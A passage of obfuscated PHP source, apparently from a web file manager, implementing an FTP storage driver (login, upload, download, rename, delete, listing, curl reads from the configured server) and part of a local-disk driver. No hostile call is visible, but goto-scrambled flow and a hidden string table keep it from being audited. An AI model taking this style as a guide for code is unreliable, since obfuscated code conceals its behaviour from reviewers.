iconvSystem($bÁ¦©À»ö) { return $this->iconvTo($bÁ¦©À»ö, $this->appCharset, $this->systemCharset); } public function getPathOuter($Aæ»ÊÖ´°„) { goto DÁÙŠ„»¾; A¿´îÙï×³: if (substr($E‹åå÷šŒ, 0, 2) == $FºÍ±îç´£[1174]) { $E‹åå÷šŒ = BASIC_PATH . substr($E‹åå÷šŒ, 2); } if (substr($Aæ»ÊÖ´°„, 0, 2) == $FºÍ±îç´£[1174]) { $Aæ»ÊÖ´°„ = BASIC_PATH . substr($Aæ»ÊÖ´°„, 2); } $E‹åå÷šŒ = KodIO::clear($E‹åå÷šŒ); goto DÒÌƒŞ©èê; AÌ ì…æ‡•: return $this->pathDriver . $FºÍ±îç´£[8] . ltrim($Aæ»ÊÖ´°„, $FºÍ±îç´£[8]); goto e÷ÌÏ“ÂÚŠ; DÁÙŠ„»¾: $FºÍ±îç´£ =& $_SERVER[ã®Â„Éæ¹¤]; $E‹åå÷šŒ = $this->iconvApp($this->pathBase); $Aæ»ÊÖ´°„ = $this->iconvApp($Aæ»ÊÖ´°„); goto A¿´îÙï×³; DÒÌƒŞ©èê: $Aæ»ÊÖ´°„ = KodIO::clear($Aæ»ÊÖ´°„); $Aæ»ÊÖ´°„ = substr($Aæ»ÊÖ´°„, strlen($E‹åå÷šŒ)); if (empty($this->pathDriver)) { return $Aæ»ÊÖ´°„; } goto AÌ ì…æ‡•; e÷ÌÏ“ÂÚŠ: } private function _init($BÚš×­ÎÎ = array()) { $c‚¬ª±ä =& $_SERVER[ã®Â„Éæ¹¤]; if (!function_exists($c‚¬ª±ä[1175])) { show_json(LNG($c‚¬ª±ä[1176]), !1); } $this->config = $BÚš×­ÎÎ; $this->charsetReset($BÚš×­ÎÎ); foreach ($BÚš×­ÎÎ as $EË…òâñØ¼ => $D´ßÏÂç) { if (isset($this->{$EË…òâñØ¼})) { $this->{$EË…òâñØ¼} = $D´ßÏÂç; } } return $this->_login($BÚš×­ÎÎ); } private function _login($B×“äÅ«Ğñ) { goto AŠŸ­ÙåË; a‚ÔÌÁ¢¢: $cˆñÕù«ïî[$DíãêºËˆŸ] = array($Dãë›©†[1180] => $this->connect, $Dãë›©†[169] => $this->host, $Dãë›©†[168] => $this->scheme, $Dãë›©†[170] => $this->port); return $CÓ´ÈÙÀ½·; goto bÃ²Œ¢å‘è; AŠŸ­ÙåË: $Dãë›©† =& $_SERVER[ã®Â„Éæ¹¤]; static $cˆñÕù«ïî = array(); $DíãêºËˆŸ = md5(json_encode($B×“äÅ«Ğñ)); goto d¿ôã‘¶‡ï; D—çíºèó: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $dÌºœËÍè = $this->pasv == $Dãë›©†[83] ? !0 : !1; @ftp_pasv($this->connect, $dÌºœËÍè); goto a‚ÔÌÁ¢¢; FÔµ¦ƒğ¢Î: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $CÓ´ÈÙÀ½· = @ftp_login($this->connect, $this->username, $this->userpass); goto D—çíºèó; aÙ‰¶ÍÂƒ•: $b¹´Ø¬ßÈ¸ = isset($F»´¸©©Öª[$Dãë›©†[168]]) && $F»´¸©©Öª[$Dãë›©†[168]] == $Dãë›©†[1177] ? !0 : !1; $this->scheme = $b¹´Ø¬ßÈ¸ ? $Dãë›©†[1178] : $Dãë›©†[1179]; $this->port = isset($F»´¸©©Öª[$Dãë›©†[170]]) ? $F»´¸©©Öª[$Dãë›©†[170]] : 21; goto FÔµ¦ƒğ¢Î; d¿ôã‘¶‡ï: if (isset($cˆñÕù«ïî[$DíãêºËˆŸ])) { foreach ($cˆñÕù«ïî[$DíãêºËˆŸ] as $b•ÒÉœœ† => $BØÖ®Ç÷×Ú) { $this->{$b•ÒÉœœ†} = $BØÖ®Ç÷×Ú; } return !0; } $F»´¸©©Öª = parse_url(trim($this->server, $Dãë›©†[8])); $this->host = $F»´¸©©Öª[$Dãë›©†[169]]; goto aÙ‰¶ÍÂƒ•; bÃ²Œ¢å‘è: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($d»áÉŒª , $Aø«µ±– = '', $B„¿Ü˜ÉõÑ = REPEAT_RENAME) { if ($this->setContent($d»áÉŒª , $Aø«µ±–)) { return $this->getPathOuter($d»áÉŒª ); } return !1; } public function mkdir($EŸĞ²«ä²•, $Eï‰ÈàÊ‰È = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $EŸĞ²«ä²• = $this->iconvSystem($EŸĞ²«ä²•); if ($this->isFolder($EŸĞ²«ä²•) || @ftp_mkdir($this->connect, $EŸĞ²«ä²•)) { return $this->getPathOuter($EŸĞ²«ä²•); } if (!$this->mkdir($this->pathFather($EŸĞ²«ä²•))) { return !1; } if ($EŸĞ²«ä²• = @ftp_mkdir($this->connect, $EŸĞ²«ä²•)) { return $this->getPathOuter($EŸĞ²«ä²•); } return !1; } public function copyFile($eˆõ±»å…Í, $B¨±‰Ã†ö¸) { goto CÇ¡Ì¶ ; E‘Ï£²…‹í: $this->tempFileRemve($dæŸ‡šƒ‘); return $dÕ¿™§ñ®•; goto b’ÑÍ¦ô; CÇ¡Ì¶ : if (!$this->_isconn()) { return !1; } $ašïŠ©¨Œ = $this->pathThis($this->iconvSystem($eˆõ±»å…Í)); $dæŸ‡šƒ‘ = $this->tempFile($ašïŠ©¨Œ); goto b–ÀèÓºÓ; b–ÀèÓºÓ: $E²ê†©ã© = $this->iconvApp($dæŸ‡šƒ‘); $this->download($eˆõ±»å…Í, $E²ê†©ã©); $dÕ¿™§ñ®• = $this->upload($B¨±‰Ã†ö¸, $E²ê†©ã©); goto E‘Ï£²…‹í; b’ÑÍ¦ô: } public function moveFile($eÖöˆµÃ÷, $C¥…Œìèëà) { if (!$this->_isconn()) { return !1; } $eÖöˆµÃ÷ = $this->iconvSystem($eÖöˆµÃ÷); $C¥…Œìèëà = $this->iconvSystem($C¥…Œìèëà); $AÔÜöæˆÖ = @ftp_rename($this->connect, $eÖöˆµÃ÷, $C¥…Œìèëà); return $AÔÜöæˆÖ ? $this->getPathOuter($C¥…Œìèëà) : !1; } public function delFile($DÇò–ÕÇĞ¶) { if (!$this->_isconn()) { return !1; } $DÇò–ÕÇĞ¶ = $this->iconvSystem($DÇò–ÕÇĞ¶); return @ftp_delete($this->connect, $DÇò–ÕÇĞ¶); } public function delFolder($c‚ñåŸ™¯Ó) { if (!$this->_isconn()) { return !1; } $c‚ñåŸ™¯Ó = $this->iconvSystem($c‚ñåŸ™¯Ó); $F¤Ğóè†Íé = $this->ftpList($c‚ñåŸ™¯Ó); if (!$F¤Ğóè†Íé) { return @ftp_rmdir($this->connect, $c‚ñåŸ™¯Ó); } foreach ($F¤Ğóè†Íé as $F†¿¹»Ğªô) { if ($this->isFolder($F†¿¹»Ğªô)) { $F†¿¹»Ğªô = $this->iconvApp($F†¿¹»Ğªô); $this->delFolder($F†¿¹»Ğªô); } else { @ftp_delete($this->connect, $F†¿¹»Ğªô); } } return @ftp_rmdir($this->connect, $c‚ñåŸ™¯Ó); } public function rename($B½’£Í©ø–, $fÈäšĞà†) { goto b„Åï¦Û¬¥; EÎ³Å™¡º–: return $bì‚¿‹¢®÷ ? $this->getPathOuter($D»ŸØî“‡Ñ) : !1; goto DÖï†çîÀ”; a†åŒÌ‚‹š: $f‘äàí§ëÃ = $this->iconvSystem($f‘äàí§ëÃ); $B½’£Í©ø– = $this->iconvSystem($B½’£Í©ø–); $aâ×·„¶ƒÛ = $this->pathFather($B½’£Í©ø–); goto B™£Ü©Ü‡”; B™£Ü©Ü‡”: $D»ŸØî“‡Ñ = rtrim($aâ×·„¶ƒÛ, $cÑÃôöÒ¶¢[8]) . $cÑÃôöÒ¶¢[8] . $f‘äàí§ëÃ; $bì‚¿‹¢®÷ = @ftp_rename($this->connect, $B½’£Í©ø–, $D»ŸØî“‡Ñ); $D»ŸØî“‡Ñ = $this->iconvApp($D»ŸØî“‡Ñ); goto EÎ³Å™¡º–; b„Åï¦Û¬¥: $cÑÃôöÒ¶¢ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->_isconn()) { return !1; } $f‘äàí§ëÃ = $this->fileNameAuto($this->pathFather($B½’£Í©ø–), $fÈäšĞà†); goto a†åŒÌ‚‹š; DÖï†çîÀ”: } private function folderInfo($CÄÙ´ˆÖ·Ê, $EÍéùÖ‘éÄ = false) { goto AùòØä“¸ò; d¯ß”øÙ’: $c˜í‰ºß–ß = $this->iconvSystem($CÄÙ´ˆÖ·Ê); if ($EÍéùÖ‘éÄ) { return array($Cˆ‡íÜÙ³¾[28] => $C¿í ¨­’, $Cˆ‡íÜÙ³¾[75] => $fğ…ùĞ¾Ä, $Cˆ‡íÜÙ³¾[29] => $Cˆ‡íÜÙ³¾[76]); } $Aô²æ›íÓ† = array($Cˆ‡íÜÙ³¾[28] => $C¿í ¨­’, $Cˆ‡íÜÙ³¾[75] => $fğ…ùĞ¾Ä, $Cˆ‡íÜÙ³¾[29] => $Cˆ‡íÜÙ³¾[76], $Cˆ‡íÜÙ³¾[187] => 0, $Cˆ‡íÜÙ³¾[107] => 0, $Cˆ‡íÜÙ³¾[1181] => !0, $Cˆ‡íÜÙ³¾[1182] => !0); goto dÌÅ–åÓ; AùòØä“¸ò: $Cˆ‡íÜÙ³¾ =& $_SERVER[ã®Â„Éæ¹¤]; $fğ…ùĞ¾Ä = $this->getPathOuter(rtrim($CÄÙ´ˆÖ·Ê, $Cˆ‡íÜÙ³¾[8])); $C¿í ¨­’ = $this->pathThis($fğ…ùĞ¾Ä); goto d¯ß”øÙ’; dÌÅ–åÓ: return $Aô²æ›íÓ†; goto AÁÅ…÷; AÁÅ…÷: } private function fileInfo($E½Ã°‘¨Š, $CÔß±¡õë¨ = false) { goto FÜÅé»Û÷Š; dÍ ¨—Êâ: $D¶³„£–[$b¦”ˆ‰Àèš[107]] = $D¶³„£–[$b¦”ˆ‰Àèš[107]] > 0 ? $D¶³„£–[$b¦”ˆ‰Àèš[107]] : 0; return $D¶³„£–; goto BÈÎ¼×Úê×; Bøßç±¬”: $dÈšËÄŒ¢‹ = $this->iconvSystem($E½Ã°‘¨Š); if ($CÔß±¡õë¨) { return array($b¦”ˆ‰Àèš[28] => $eåê“ëˆÓ‚, $b¦”ˆ‰Àèš[75] => $aÛÆ»Ÿ´‰, $b¦”ˆ‰Àèš[29] => $b¦”ˆ‰Àèš[167], $b¦”ˆ‰Àèš[160] => $this->ext($E½Ã°‘¨Š), $b¦”ˆ‰Àèš[77] => $this->size($E½Ã°‘¨Š)); } $D¶³„£– = array($b¦”ˆ‰Àèš[28] => $eåê“ëˆÓ‚, $b¦”ˆ‰Àèš[75] => $aÛÆ»Ÿ´‰, $b¦”ˆ‰Àèš[29] => $b¦”ˆ‰Àèš[167], $b¦”ˆ‰Àèš[187] => 0, $b¦”ˆ‰Àèš[107] => @ftp_mdtm($this->connect, $dÈšËÄŒ¢‹), $b¦”ˆ‰Àèš[160] => $this->ext($E½Ã°‘¨Š), $b¦”ˆ‰Àèš[77] => $this->size($E½Ã°‘¨Š), $b¦”ˆ‰Àèš[1181] => !0, $b¦”ˆ‰Àèš[1182] => !0); goto dÍ ¨—Êâ; FÜÅé»Û÷Š: $b¦”ˆ‰Àèš =& $_SERVER[ã®Â„Éæ¹¤]; $aÛÆ»Ÿ´‰ = $this->getPathOuter(rtrim($E½Ã°‘¨Š, $b¦”ˆ‰Àèš[8])); $eåê“ëˆÓ‚ = $this->pathThis($aÛÆ»Ÿ´‰); goto Bøßç±¬”; BÈÎ¼×Úê×: } public function size($a´ŒŸÈÚ¨î) { $dÑ¿¤à·Ó› = $this->objectMeta($a´ŒŸÈÚ¨î); return $dÑ¿¤à·Ó› ? $dÑ¿¤à·Ó›[$_SERVER[ã®Â„Éæ¹¤][77]] : 0; } public function info($bµ¸â“‘†é) { if ($this->isFile($bµ¸â“‘†é)) { return $this->fileInfo($bµ¸â“‘†é, 0); } else { if ($this->isFolder($bµ¸â“‘†é)) { return $this->folderInfo($bµ¸â“‘†é); } } return !1; } public function exist($e™ÚÉÙ·¨) { return $this->objectMeta($e™ÚÉÙ·¨) ? !0 : !1; } public function isFile($aÑÅÍ‰Õ‡ï) { $D«Î•¶¯ =& $_SERVER[ã®Â„Éæ¹¤]; $fÈòÆö‰Îœ = $this->objectMeta($aÑÅÍ‰Õ‡ï); return $fÈòÆö‰Îœ ? $fÈòÆö‰Îœ[$D«Î•¶¯[29]] == $D«Î•¶¯[167] : !1; } public function isFolder($Dòé™øÄ½) { $B‘–÷³é’‡ =& $_SERVER[ã®Â„Éæ¹¤]; $e¦Á«İà ğ = $this->objectMeta($Dòé™øÄ½); return $e¦Á«İà ğ ? $e¦Á«İà ğ[$B‘–÷³é’‡[29]] == $B‘–÷³é’‡[76] : !1; } public function listPath($A‘ÜÓ¥æ‡°, $D¼…ÈË›é¦ = false) { goto c‰÷ÓÙ’Î«; c‰÷ÓÙ’Î«: $C»õ¸Ø²êĞ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->_isconn()) { return !1; } $A‘ÜÓ¥æ‡° = $this->iconvSystem($A‘ÜÓ¥æ‡°); goto A¼²…¤¸Å¾; A¼²…¤¸Å¾: $A•œ‘äİá = $this->ftpList($A‘ÜÓ¥æ‡°); $f™Â»¿¶‡Î = array($C»õ¸Ø²êĞ[74] => array(), $C»õ¸Ø²êĞ[73] => array()); if (!$A•œ‘äİá) { return $f™Â»¿¶‡Î; } goto ağ°÷´ĞÕ; ağ°÷´ĞÕ: foreach ($A•œ‘äİá as $A‘ÜÓ¥æ‡°) { if ($this->isFolder($A‘ÜÓ¥æ‡°)) { $f™Â»¿¶‡Î[$C»õ¸Ø²êĞ[74]][] = $this->folderInfo($A‘ÜÓ¥æ‡°, $D¼…ÈË›é¦); } else { $f™Â»¿¶‡Î[$C»õ¸Ø²êĞ[73]][] = $this->fileInfo($A‘ÜÓ¥æ‡°, $D¼…ÈË›é¦); } } return $f™Â»¿¶‡Î; goto C«¬–ç®Ó; C«¬–ç®Ó: } public function has($A¼¢ÜŠù­ù, $fçÒà–‹ÛÎ = false, $FĞ’‰’Ã” = true) { goto d»‹å”½öœ; Fù·„‡óÅ: foreach ($Fó¿İéÛ… as $A¼¢ÜŠù­ù) { if ($FĞ’‰’Ã”) { if (!$this->isFolder($A¼¢ÜŠù­ù)) { return !0; } } else { if ($this->isFolder($A¼¢ÜŠù­ù)) { return !0; } } } return !1; goto b–„àÛÁÊª; AÇ‘“Ÿ¬¡Ö: $Fó¿İéÛ… = $this->ftpList($A¼¢ÜŠù­ù); if (!$Fó¿İéÛ…) { return !1; } if ($fçÒà–‹ÛÎ) { return array($CäÒ¡Çé¬™[191] => 0, $CäÒ¡Çé¬™[192] => count($Fó¿İéÛ…)); } goto Fù·„‡óÅ; d»‹å”½öœ: $CäÒ¡Çé¬™ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->_isconn()) { return !1; } $A¼¢ÜŠù­ù = $this->iconvSystem($A¼¢ÜŠù­ù); goto AÇ‘“Ÿ¬¡Ö; b–„àÛÁÊª: } public function listAll($Cîô¨å×°Ş) { goto C»ÖÒì”Ç£; a…®Õöîê: $e·ò×È‰­§ = array($AŠ”ˆª·Ì[73] => array(), $AŠ”ˆª·Ì[74] => array()); $this->recursionFtpFiles($Cîô¨å×°Ş, $e·ò×È‰­§); $b·îïğÓ›Ş = array(); goto b«­ÒÕ; b«­ÒÕ: foreach ($e·ò×È‰­§[$AŠ”ˆª·Ì[74]] as $a­©Óä¥à) { $b·îïğÓ›Ş[] = array($AŠ”ˆª·Ì[75] => $AŠ”ˆª·Ì[8] . trim(str_replace($Cîô¨å×°Ş, $AŠ”ˆª·Ì[33], $a­©Óä¥à), $AŠ”ˆª·Ì[8]) . $AŠ”ˆª·Ì[8], $AŠ”ˆª·Ì[76] => 1, $AŠ”ˆª·Ì[77] => 0); } foreach ($e·ò×È‰­§[$AŠ”ˆª·Ì[73]] as $f•†ÂŸóÑÎ) { $b·îïğÓ›Ş[] = array($AŠ”ˆª·Ì[75] => $AŠ”ˆª·Ì[8] . trim(str_replace($Cîô¨å×°Ş, $AŠ”ˆª·Ì[33], $f•†ÂŸóÑÎ), $AŠ”ˆª·Ì[8]), $AŠ”ˆª·Ì[76] => 0, $AŠ”ˆª·Ì[77] => $this->size($f•†ÂŸóÑÎ)); } return $b·îïğÓ›Ş; goto dø¿äÙÇ£™; C»ÖÒì”Ç£: $AŠ”ˆª·Ì =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->_isconn()) { return !1; } $Cîô¨å×°Ş = $this->iconvSystem($Cîô¨å×°Ş); goto a…®Õöîê; dø¿äÙÇ£™: } public function getContent($e­Éœõ£Æ†) { if (!$this->_isconn()) { return !1; } $e­Éœõ£Æ† = $this->iconvSystem($e­Éœõ£Æ†); return $this->fileSubstr($e­Éœõ£Æ†); } public function setContent($cò°›œİ, $a·ƒÆ³ÌÌ = '') { goto føƒîîğ¦™; føƒîîğ¦™: if (!$this->_isconn()) { return !1; } $D¿£µ¤Ğñ = $this->pathThis($this->iconvSystem($cò°›œİ)); $DĞ½¡¥šº = $this->tempFile($D¿£µ¤Ğñ); goto bÙ‘ØâÖ‹; b¢»¹éË•ƒ: return $B‘‘¢ÛÜ; goto b¾Ñ·ø¬¿°; bÙ‘ØâÖ‹: file_put_contents($DĞ½¡¥šº, $a·ƒÆ³ÌÌ); $B‘‘¢ÛÜ = $this->upload($cò°›œİ, $this->iconvApp($DĞ½¡¥šº)); $this->tempFileRemve($DĞ½¡¥šº); goto b¢»¹éË•ƒ; b¾Ñ·ø¬¿°: } public function fileSubstr($EŠ……ÄœÖ†, $F¿²Ñ”ÊÒ = 0, $c•à·æ§Ù– = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($EŠ……ÄœÖ†, $F¿²Ñ”ÊÒ, $c•à·æ§Ù–); } private function ftpRequest($Dì÷áæÁ£İ, $cøÛ”ºŠäê = 0, $aƒÇ®½Š‹î = false) { goto E™ºªÂ—ß£; B–ˆÄÅ‰†­: return $F‘‰ÖßÖèù; goto b–æï•í™™; E™ºªÂ—ß£: $Dì÷áæÁ£İ = $this->iconvSystem($Dì÷áæÁ£İ); $CäƒŸ…ß¡à = $this->scheme . $this->host . $_SERVER[ã®Â„Éæ¹¤][4] . $this->port; $bÀ¨ä‡…ã• = curl_init(); goto cÆëĞíœœ¬; cÆëĞíœœ¬: curl_setopt($bÀ¨ä‡…ã•, CURLOPT_URL, $CäƒŸ…ß¡à . $this->pathEncode($Dì÷áæÁ£İ)); curl_setopt($bÀ¨ä‡…ã•, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($aƒÇ®½Š‹î) { $Fß…ì×» = $cøÛ”ºŠäê + $aƒÇ®½Š‹î - 1; curl_setopt($bÀ¨ä‡…ã•, CURLOPT_RANGE, "{$cøÛ”ºŠäê}\55{$Fß…ì×»}"); } goto f¯ÅŞÃ²ŠÀ; f¯ÅŞÃ²ŠÀ: curl_setopt($bÀ¨ä‡…ã•, CURLOPT_RETURNTRANSFER, 1); $F‘‰ÖßÖèù = curl_exec($bÀ¨ä‡…ã•); curl_close($bÀ¨ä‡…ã•); goto B–ˆÄÅ‰†­; b–æï•í™™: } public function upload($F™Ê©ÂºÕµ, $eÅ–×Çàä¨, $E‡£ö÷ªÒ¯ = false, $eÒŒ¶•åÀ‹ = REPEAT_REPLACE) { goto B‡§ÁÓÂÉ°; B‡§ÁÓÂÉ°: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($F™Ê©ÂºÕµ))) { return !1; } $F™Ê©ÂºÕµ = $this->iconvSystem($F™Ê©ÂºÕµ); goto cùÇ«‡ªêÇ; a«‡®½ÕØ: if ($B‰Ğ¼ƒñ… != FTP_FINISHED) { return !1; } return $this->getPathOuter($F™Ê©ÂºÕµ); goto DÂŞ©ÌÉ š; cùÇ«‡ªêÇ: $eÅ–×Çàä¨ = $this->iconvSystem($eÅ–×Çàä¨); $B‰Ğ¼ƒñ… = ftp_nb_put($this->connect, $F™Ê©ÂºÕµ, $eÅ–×Çàä¨, FTP_BINARY); while ($B‰Ğ¼ƒñ… == FTP_MOREDATA) { $B‰Ğ¼ƒñ… = ftp_nb_continue($this->connect); } goto a«‡®½ÕØ; DÂŞ©ÌÉ š: } public function download($FÀßÉ©ôí, $E¯²ªºÑù« = '') { goto FÌøíª¯†; FÌøíª¯†: if (!$this->_isconn()) { return !1; } $fË””›¯ë¥ = $this->pathFather($E¯²ªºÑù«); if (!IO::mkdir($fË””›¯ë¥)) { return !1; } goto C›½ÌŸ‰ªè; dºÚ„·Û¨ö: while ($Dà¾ã—ÀĞˆ == FTP_MOREDATA) { $Dà¾ã—ÀĞˆ = ftp_nb_continue($this->connect); } if ($Dà¾ã—ÀĞˆ != FTP_FINISHED) { return !1; } return $this->iconvApp($E¯²ªºÑù«); goto d®ìğÆ¤Ö®; C›½ÌŸ‰ªè: $FÀßÉ©ôí = $this->iconvSystem($FÀßÉ©ôí); $E¯²ªºÑù« = $this->iconvSystem($E¯²ªºÑù«); $Dà¾ã—ÀĞˆ = ftp_nb_get($this->connect, $E¯²ªºÑù«, $FÀßÉ©ôí, FTP_BINARY); goto dºÚ„·Û¨ö; d®ìğÆ¤Ö®: } private function ftpList($A‡Ø£Ì¦ÏÈ) { goto DÈ…Ïê‹Ø; dçá½ÇÅƒœ: return $eìœäåù­; goto b–é“óâô; b÷„¢Ô˜ÒÍ: $BƒÄîƒÕ = array_diff($BƒÄîƒÕ, array($e²É¥ï¤àİ[91], $e²É¥ï¤àİ[1184], $A‡Ø£Ì¦ÏÈ . $e²É¥ï¤àİ[91], $A‡Ø£Ì¦ÏÈ . $e²É¥ï¤àİ[1184])); $eìœäåù­ = array(); foreach ($BƒÄîƒÕ as $D—ÂÁç™†) { if (!strstr($D—ÂÁç™†, $e²É¥ï¤àİ[8])) { $D—ÂÁç™† = $A‡Ø£Ì¦ÏÈ . ltrim($D—ÂÁç™†, $e²É¥ï¤àİ[8]); } $eìœäåù­[] = $this->iconvApp($D—ÂÁç™†); } goto dçá½ÇÅƒœ; DÈ…Ïê‹Ø: $e²É¥ï¤àİ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->isFolder($A‡Ø£Ì¦ÏÈ)) { return !1; } @ftp_chdir($this->connect, $e²É¥ï¤àİ[8]); goto bóÍß”Ó…è; bóÍß”Ó…è: $A‡Ø£Ì¦ÏÈ = rtrim($A‡Ø£Ì¦ÏÈ, $e²É¥ï¤àİ[8]) . $e²É¥ï¤àİ[8]; $BƒÄîƒÕ = @ftp_nlist($this->connect, $A‡Ø£Ì¦ÏÈ); if ($BƒÄîƒÕ === !1) { $BƒÄîƒÕ = @ftp_rawlist($this->connect, $A‡Ø£Ì¦ÏÈ); foreach ($BƒÄîƒÕ as $C–È¥ù¸ => $e¾” Şå¢») { $BƒÄîƒÕ[$C–È¥ù¸] = end(explode($e²É¥ï¤àİ[1183], $e¾” Şå¢»)); } } goto b÷„¢Ô˜ÒÍ; b–é“óâô: } private function recursionFtpFiles($D¹³±°ƒöµ, &$dæÂ¼ƒ£äë) { $cˆ…àÒ³¯’ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->_isconn()) { return !1; } if (!($aÔÄ‡„¾‹” = $this->ftpList($D¹³±°ƒöµ))) { return !1; } foreach ($aÔÄ‡„¾‹” as $D¹³±°ƒöµ) { if ($this->isFolder($D¹³±°ƒöµ)) { $this->recursionFtpFiles($D¹³±°ƒöµ, $dæÂ¼ƒ£äë); $dæÂ¼ƒ£äë[$cˆ…àÒ³¯’[74]][] = $D¹³±°ƒöµ; } else { $dæÂ¼ƒ£äë[$cˆ…àÒ³¯’[73]][] = $D¹³±°ƒöµ; } } } private function objectMeta($Fèê†Œ×ñÑ) { goto B»õÊÛì¹î; cŒ–ÊÈ™ëÅ: return $bß”´ğ¯¿; goto F¤™Æ˜½‘æ; d¶Ğ«ÕÒ®ñ: if ($bß”´ğ¯¿ !== null && $bß”´ğ¯¿ !== !1) { return $bß”´ğ¯¿; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $aÂÀ¶¨À­¦[8]); goto C”í‘†¦²ô; C”í‘†¦²ô: $D†•¼Öõ²Õ = @ftp_size($this->connect, $this->iconvSystem($Fèê†Œ×ñÑ)); if ($D†•¼Öõ²Õ != -1) { $bß”´ğ¯¿ = array($aÂÀ¶¨À­¦[77] => $D†•¼Öõ²Õ, $aÂÀ¶¨À­¦[29] => $aÂÀ¶¨À­¦[167]); } else { $càßèùÑñ¶ = @ftp_chdir($this->connect, $this->iconvSystem($Fèê†Œ×ñÑ)); $bß”´ğ¯¿ = $càßèùÑñ¶ ? array($aÂÀ¶¨À­¦[77] => 0, $aÂÀ¶¨À­¦[29] => $aÂÀ¶¨À­¦[76]) : !1; } Cache::set($aàê‚œä¹Î, $bß”´ğ¯¿, 0); goto cŒ–ÊÈ™ëÅ; B»õÊÛì¹î: $aÂÀ¶¨À­¦ =& $_SERVER[ã®Â„Éæ¹¤]; $aàê‚œä¹Î = $aÂÀ¶¨À­¦[1185] . md5($Fèê†Œ×ñÑ); $bß”´ğ¯¿ = Cache::get($aàê‚œä¹Î); goto d¶Ğ«ÕÒ®ñ; F¤™Æ˜½‘æ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($eŞ¦»ªÂîˆ) { if (substr($eŞ¦»ªÂîˆ, 0, 2) == $_SERVER[ã®Â„Éæ¹¤][1174]) { $eŞ¦»ªÂîˆ = BASIC_PATH . substr($eŞ¦»ªÂîˆ, 2); } return $eŞ¦»ªÂîˆ; } public function iconvApp($EÌô¹ˆÖË³) { $Fƒì½áÍ†¥ =& $_SERVER[ã®Â„Éæ¹¤]; global $config; return $this->iconvTo($EÌô¹ˆÖË³, $config[$Fƒì½áÍ†¥[1172]], $config[$Fƒì½áÍ†¥[1171]]); } public function iconvSystem($eéÈä›´Ç) { $aÜŞ™¿°Èà =& $_SERVER[ã®Â„Éæ¹¤]; global $config; return $this->iconvTo($eéÈä›´Ç, $config[$aÜŞ™¿°Èà[1171]], $config[$aÜŞ™¿°Èà[1172]]); } public function getPathOuter($C©ó¹Œ¨ãô) { goto Bè§âµ£ˆË; f³µ¨‘Üîï: return $this->pathDriver . $BÁ‚…ùÛÎÌ[8] . ltrim($C©ó¹Œ¨ãô, $BÁ‚…ùÛÎÌ[8]); goto A‹­İñ³åÜ; D× °¥¨Ò¢: if (substr($d‹­„Ö¿¬Û, 0, 2) == $BÁ‚…ùÛÎÌ[1174]) { $d‹­„Ö¿¬Û = BASIC_PATH . substr($d‹­„Ö¿¬Û, 2); } if (substr($C©ó¹Œ¨ãô, 0, 2) == $BÁ‚…ùÛÎÌ[1174]) { $C©ó¹Œ¨ãô = BASIC_PATH . substr($C©ó¹Œ¨ãô, 2); } $d‹­„Ö¿¬Û = KodIO::clear($d‹­„Ö¿¬Û); goto Cğ¥†ÑĞÄ©; Cğ¥†ÑĞÄ©: $C©ó¹Œ¨ãô = KodIO::clear($C©ó¹Œ¨ãô); $C©ó¹Œ¨ãô = substr($C©ó¹Œ¨ãô, strlen($d‹­„Ö¿¬Û)); if (empty($this->pathDriver)) { return $C©ó¹Œ¨ãô; } goto f³µ¨‘Üîï; Bè§âµ£ˆË: $BÁ‚…ùÛÎÌ =& $_SERVER[ã®Â„Éæ¹¤]; $d‹­„Ö¿¬Û = $this->iconvApp($this->pathBase); $C©ó¹Œ¨ãô = $this->iconvApp($C©ó¹Œ¨ãô); goto D× °¥¨Ò¢; A‹­İñ³åÜ: } public function mkfile($A™öùÂŞ¥«, $E‡æŠ„ÎÙ = '', $B–†ñ¢ìçÜ = REPEAT_RENAME) { $A™öùÂŞ¥« = $this->iconvSystem($A™öùÂŞ¥«); @touch($A™öùÂŞ¥«); if ($E‡æŠ„ÎÙ) { file_put_contents($A™öùÂŞ¥«, $E‡æŠ„ÎÙ); } return is_file($A™öùÂŞ¥«) ? $this->getPathOuter($A™öùÂŞ¥«) : !1; } public function mkdir($BÑÅâ•¶ÙÌ, $FØÀÉÔ‰ = REPEAT_SKIP) { $BÑÅâ•¶ÙÌ = $this->iconvSystem($BÑÅâ•¶ÙÌ); if (is_dir($BÑÅâ•¶ÙÌ)) { return $this->getPathOuter($BÑÅâ•¶ÙÌ); } @mkdir($BÑÅâ•¶ÙÌ, 511, !0); return is_dir($BÑÅâ•¶ÙÌ) ? $this->getPathOuter($BÑÅâ•¶ÙÌ) : !1; } public function copyFile($c™å¼Ù°²œ, $E°¼ç´¸ª—) { $this->mkdir($this->pathFather($E°¼ç´¸ª—)); $c™å¼Ù°²œ = $this->iconvSystem($c™å¼Ù°²œ); $E°¼ç´¸ª— = $this->iconvSystem($E°¼ç´¸ª—); $e‰Úõ«ò†ö = @copy($c™å¼Ù°²œ, $E°¼ç´¸ª—); return $e‰Úõ«ò†ö ? $this->getPathOuter($E°¼ç´¸ª—) : !1; } public function moveFile($EÎŞÒ„›¾…, $AØÉˆÙ®Ë‘) { $this->mkdir($this->pathFather($AØÉˆÙ®Ë‘)); $EÎŞÒ„›¾… = $this->iconvSystem($EÎŞÒ„›¾…); $AØÉˆÙ®Ë‘ = $this->iconvSystem($AØÉˆÙ®Ë‘); $dÙ…¨ªÅ—— = intval(@rename($EÎŞÒ„›¾…, $AØÉˆÙ®Ë‘)); if (!$dÙ…¨ªÅ——) { if ($dÙ…¨ªÅ—— = intval(@copy($EÎŞÒ„›¾…, $AØÉˆÙ®Ë‘))) { @unlink($EÎŞÒ„›¾…); } } return $dÙ…¨ªÅ—— ? 